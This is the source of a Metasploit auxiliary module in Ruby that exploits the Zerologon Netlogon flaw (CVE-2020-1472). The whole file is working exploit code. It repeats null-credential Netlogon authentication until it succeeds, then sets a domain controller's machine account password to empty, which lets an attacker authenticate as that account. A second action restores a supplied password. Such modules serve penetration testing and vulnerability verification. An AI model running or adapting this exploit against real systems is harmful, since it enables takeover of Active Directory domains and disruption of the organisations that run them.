##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client
  include Msf::Auxiliary::Report

  CheckCode = Exploit::CheckCode
  Netlogon = RubySMB::Dcerpc::Netlogon
  EMPTY_SHARED_SECRET = OpenSSL::Digest.digest('MD4', '')

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Netlogon Weak Cryptographic Authentication',
        'Description' => %q{
          A vulnerability exists within the Netlogon authentication process where the security properties granted by AES
          are lost due to an implementation flaw related to the use of a static initialization vector (IV). An attacker
          can leverage this flaw to target an Active Directory Domain Controller and make repeated authentication attempts
          using NULL data fields which will succeed every 1 in 256 tries (~0.4%). This module leverages the vulnerability
          to reset the machine account password to an empty string, which will then allow the attacker to authenticate as
          the machine account. After exploitation, it's important to restore this password to it's original value. Failure
          to do so can result in service instability.
        },
        'Author' => [
          'Tom Tervoort', # original vulnerability details
          'Spencer McIntyre', # metasploit module
          'Dirk-jan Mollema' # password restoration technique
        ],
        'Notes' => {
          'AKA' => [ 'Zerologon' ]
        },
        'License' => MSF_LICENSE,
        'Actions' => [
          [ 'REMOVE', { 'Description' => 'Remove the machine account password' } ],
          [ 'RESTORE', { 'Description' => 'Restore the machine account password' } ]
        ],
        'DefaultAction' => 'REMOVE',
        'References' => [
          [ 'CVE', '2020-1472' ],
          [ 'URL', 'https://www.secura.com/blog/zero-logon' ],
          [ 'URL', 'https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py' ],
          [ 'URL', 'https://github.com/dirkjanm/CVE-2020-1472/blob/master/restorepassword.py' ]
        ]
      )
    )

    register_options(
      [
        OptPort.new('RPORT', [ false, 'The netlogon RPC port' ]),
        OptString.new('NBNAME', [ true, 'The server\'s NetBIOS name' ]),
        OptString.new('PASSWORD', [ false, 'The password to restore for the machine account (in hex)' ], conditions: %w[ACTION == RESTORE]),
      ]
    )
  end

  def peer
    "#{rhost}:#{@dport || datastore['RPORT']}"
  end

  def bind_to_netlogon_service
    @dport = datastore['RPORT']
    if @dport.nil? || @dport == 0
      @dport = dcerpc_endpoint_find_tcp(datastore['RHOST'], Netlogon::UUID, '1.0', 'ncacn_ip_tcp')
      fail_with(Failure::NotFound, 'Could not determine the RPC port used by the Microsoft Netlogon Server') unless @dport
    end

    # Bind to the service
    handle = dcerpc_handle(Netlogon::UUID, '1.0', 'ncacn_ip_tcp', [@dport])
    print_status("Binding to #{handle} ...")
    dcerpc_bind(handle)
    print_status("Bound to #{handle} ...")
  end

  def check
    bind_to_netlogon_service

    status = nil
    2000.times do
      netr_server_req_challenge
      response = netr_server_authenticate3

      break if (status = response.error_status) == 0
    end

    return CheckCode::Detected unless status == 0

    CheckCode::Vulnerable
  end

  def run
    case action.name
    when 'REMOVE'
      action_remove_password
    when 'RESTORE'
      action_restore_password
    end
  end

  def action_remove_password
    fail_with(Failure::Unknown, 'Failed to authenticate to the server by leveraging the vulnerability') unless check == CheckCode::Vulnerable

    print_good('Successfully authenticated')

    report_vuln(
      host: rhost,
      port: @dport,
      name: name,
      sname: 'dcerpc',
      proto: 'tcp',
      refs: references,
      info: "Module #{fullname} successfully authenticated to the server without knowledge of the shared secret"
    )

    response = netr_server_password_set2
    status = response.error_status.to_i
    fail_with(Failure::UnexpectedReply, "Password change failed with NT status: 0x#{status.to_s(16)}") unless status == 0

    print_good("Successfully set the machine account (#{datastore['NBNAME']}$) password to: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 (empty)")
  end

  def action_restore_password
    fail_with(Failure::BadConfig, 'The RESTORE action requires the PASSWORD option to be set') if datastore['PASSWORD'].blank?
    fail_with(Failure::BadConfig, 'The PASSWORD option must be in hex') if /^([0-9a-fA-F]{2})+$/ !~ datastore['PASSWORD']
    password = [datastore['PASSWORD']].pack('H*')

    bind_to_netlogon_service
    client_challenge = OpenSSL::Random.random_bytes(8)

    response = netr_server_req_challenge(client_challenge: client_challenge)
    session_key = Netlogon.calculate_session_key(EMPTY_SHARED_SECRET, client_challenge, response.server_challenge)
    ppp = Netlogon.encrypt_credential(session_key, client_challenge)

    response = netr_server_authenticate3(client_credential: ppp)
    fail_with(Failure::NoAccess, 'Failed to authenticate (the machine account password may not be empty)') unless response.error_status == 0

    new_password_data = ("\x00" * (512 - password.length)) + password + [password.length].pack('V')
    response = netr_server_password_set2(
      authenticator: Netlogon::NetlogonAuthenticator.new(
        credential: Netlogon.encrypt_credential(session_key, [ppp.unpack1('Q') + 10].pack('Q')),
        timestamp: 10
      ),
      clear_new_password: Netlogon.encrypt_credential(session_key, new_password_data)
    )
    status = response.error_status.to_i
    fail_with(Failure::UnexpectedReply, "Password change failed with NT status: 0x#{status.to_s(16)}") unless status == 0

    print_good("Successfully set machine account (#{datastore['NBNAME']}$) password")
  end

  def netr_server_authenticate3(client_credential: "\x00" * 8)
    nrpc_call('NetrServerAuthenticate3',
              primary_name: "\\\\#{datastore['NBNAME']}",
              account_name: "#{datastore['NBNAME']}$",
              secure_channel_type: :ServerSecureChannel,
              computer_name: datastore['NBNAME'],
              client_credential: client_credential,
              flags: 0x212fffff)
  end

  def netr_server_password_set2(authenticator: nil, clear_new_password: "\x00" * 516)
    authenticator ||= Netlogon::NetlogonAuthenticator.new(credential: "\x00" * 8, timestamp: 0)
    nrpc_call('NetrServerPasswordSet2',
              primary_name: "\\\\#{datastore['NBNAME']}",
              account_name: "#{datastore['NBNAME']}$",
              secure_channel_type: :ServerSecureChannel,
              computer_name: datastore['NBNAME'],
              authenticator: authenticator,
              clear_new_password: clear_new_password)
  end

  def netr_server_req_challenge(client_challenge: "\x00" * 8)
    nrpc_call('NetrServerReqChallenge',
              primary_name: "\\\\#{datastore['NBNAME']}",
              computer_name: datastore['NBNAME'],
              client_challenge: client_challenge)
  end

  def nrpc_call(name, **kwargs)
    request = Netlogon.const_get("#{name}Request").new(**kwargs)

    begin
      raw_response = dcerpc.call(request.opnum, request.to_binary_s)
    rescue Rex::Proto::DCERPC::Exceptions::Fault
      fail_with(Failure::UnexpectedReply, "The #{name} Netlogon RPC request failed")
    end

    Netlogon.const_get("#{name}Response").read(raw_response)
  end
end
